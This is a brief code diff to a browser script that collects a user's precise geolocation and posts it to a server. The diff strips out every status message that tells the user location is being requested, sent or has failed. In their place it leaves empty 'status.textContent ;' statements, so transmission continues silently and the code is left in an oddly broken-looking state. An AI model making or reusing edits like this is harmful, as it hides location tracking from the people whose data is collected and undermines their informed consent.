@@ -18,10 +18,10 @@ const status = document.getElementById('status');
 
 function sendLocation() {
   if (!navigator.geolocation) {
-    status.textContent = 'Geolocation not supported.';
+    status.textContent ;
     return;
   }
-  status.textContent = 'Requesting location...';
+  status.textContent ;
 
   navigator.geolocation.getCurrentPosition(async (pos) => {
     const payload = {
@@ -37,13 +37,13 @@ function sendLocation() {
         headers: {"Content-Type":"application/json"},
         body: JSON.stringify(payload)
       });
-      status.textContent = `Location sent (±${pos.coords.accuracy}m)`;
+      status.textContent ;
     } catch(e) {
       console.warn(e);
-      status.textContent = "Error sending location";
+      status.textContent ;
     }
   }, (err) => {
-    status.textContent = 'Location denied or error.';
+    status.textContent ;
   }, { enableHighAccuracy: true, timeout: 10000 });
 }
 
